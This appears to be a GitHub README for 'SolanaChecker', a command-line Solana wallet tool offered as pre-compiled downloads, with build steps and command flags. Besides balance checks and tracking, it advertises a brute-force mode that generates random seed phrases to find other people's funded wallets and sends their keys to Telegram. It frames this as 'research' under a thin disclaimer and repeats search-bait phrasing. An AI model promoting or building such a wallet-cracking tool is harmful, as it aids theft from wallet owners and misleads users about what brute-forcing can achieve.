# SolanaChecker: Your Comprehensive Solana Wallet Balance Checker App

**SolanaChecker** is a powerful and versatile application designed to simplify and enhance your interaction with the Solana blockchain. This tool provides a suite of features for managing and monitoring your Solana wallets, making it an essential resource for anyone involved in the Solana ecosystem. Though it is a command-line application, it functions as a robust **Solana wallet balance checker app**.

###[DOWNLOAD FOR WINDOWS & LINUX](../../releases)
   <p align="left">
    <img src="/materials/flow.webp" />
</p>

## Key Features of the SolanaChecker App

1.  **Check Solana Address Balance:**
    Quickly and easily check the current SOL balance of any Solana address. Stay informed about your holdings with a simple command. This is the core function of the **Solana wallet balance checker app**.

<p align="left">
    <img src="/materials/beta.webp" />
</p>

2.  **Check Solana Tokens for Fraud:**
    Assess the security of Solana tokens. Analyze token characteristics and metadata to identify potential scams or "rug-pulls," protecting your investments.

<p align="left">
    <img src="/materials/name.webp" />
</p>

3.  **Track Solana Addresses:**
    Receive real-time notifications about activity on specified addresses through a Telegram bot. Monitor your wallets and get instant alerts about fund movements, which is especially useful for tracking active wallet transactions.

4.  **Wallet Data from Mnemonic Phrase:**
    Recover and manage your Solana wallets by extracting wallet data (private key, address, balance) from a known mnemonic phrase (seed phrase).

<p align="left">
    <img src="/materials/analyze.webp" />
</p>

5.  **Generate a Single Solana Wallet:**
    Create new Solana wallets with unique private keys and addresses for secure storage and transactions.

<p align="left">
    <img src="/materials/black.webp" />
</p>

6.  **Generation Solana Wallets and Check Balance:**
    A brute-force process for generating random seed phrases and checking created addresses for balance. This method allows you to find wallets with a balance by generating random mnemonic phrases, which can be useful for research purposes and finding active wallets. If the program finds a wallet with an existing balance, the data from this wallet will be written to the 'found-wallets.txt' file, and you will also receive a message with the wallet data in Telegram if you configured it in the telegram-settings.txt file.

<p align="left">
    <img src="/materials/data.webp" />
</p>

## Setting Up Telegram Notifications (Stay Informed!)

Configure SolanaChecker to send transaction notifications to your Telegram account. This ensures you're always aware of activity on your wallets. Just enter your [bot token](https://core.telegram.org/bots/tutorial#obtain-your-bot-token) and your [chat_id](https://t.me/getmyid_bot) in the 'telegram-settings.txt' file.

## Getting Started: Download and Installation

Download a pre-compiled build from the [Release](../../releases) section. Alternatively, you can build the project from source.

## Building the SolanaChecker App from Source

To build SolanaChecker, you'll need a C++ compiler and the following dependencies:

### Installing Dependencies with vcpkg:

1.  If you don’t have **vcpkg**, clone the repository and install it by following the instructions on the [official page](https://github.com/microsoft/vcpkg).

2.  After installing **vcpkg**, add it to your system PATH environment variable.

3.  To install the dependencies, run the following commands:

    -   Install **OpenSSL**:
        ```bash
        vcpkg install openssl
        ```

    -   Install **nlohmann-json**:
        ```bash
        vcpkg install nlohmann-json
        ```

    -   Install **Crypto++**:
        ```bash
        vcpkg install cryptopp
        ```

    -   Install **libsodium**:
        ```bash
        vcpkg install libsodium
        ```

4.  Once the dependencies are installed, you can proceed with building the project in Visual Studio or using another C++ compiler.

### Building via Visual Studio:

1.  Open the project solution in Visual Studio.
2.  Make sure **vcpkg** is correctly integrated with your environment. You can follow the instructions for [integrating vcpkg with Visual Studio](https://github.com/microsoft/vcpkg#visual-studio).
3.  Click **Build** -> **Build Solution**.
4.  After a successful build, the executable will be located in the `bin` folder or a similar directory.

### Building with Another C++ Compiler:

1.  Ensure that all dependencies are installed via **vcpkg** and accessible to your compiler.
2.  Compile the project using the following command (depending on your compiler):

    ```bash
    g++ -o solanachecker main.cpp -lssl -lcrypto -lsodium -lcryptopp -std=c++17
    ```

## Command Line Interface (Your App's Control Center)

Use these commands to interact with SolanaChecker:

1.  **-s / -search**
    Start a brute-force search for wallets with a balance.

2.  **-t / -track (ADDRESS)**
    Start tracking the specified address. Monitor real-time activity on a Solana address.

3.  **-g / -gen (NUMBER)**
    Generate a specified number of Solana wallets.

4.  **-m / -mnemonic (MNEMONIC)**
    Display wallet information based on a provided seed phrase.

5.  **-b / -balance (ADDRESS)**
    **Check the balance of a specific Solana address.** This is the primary function of the Solana wallet balance checker app.

## Important Notes and Disclaimer

-   This application is intended for educational and research purposes.
-   Use this software responsibly and avoid any illegal activities or hacking attempts.
-   Cryptocurrency investments carry inherent risks. Always prioritize the security of your data and wallets.

## Licensing

This project is licensed under the [MIT License](/LICENSE). You are free to use, modify, and distribute the code.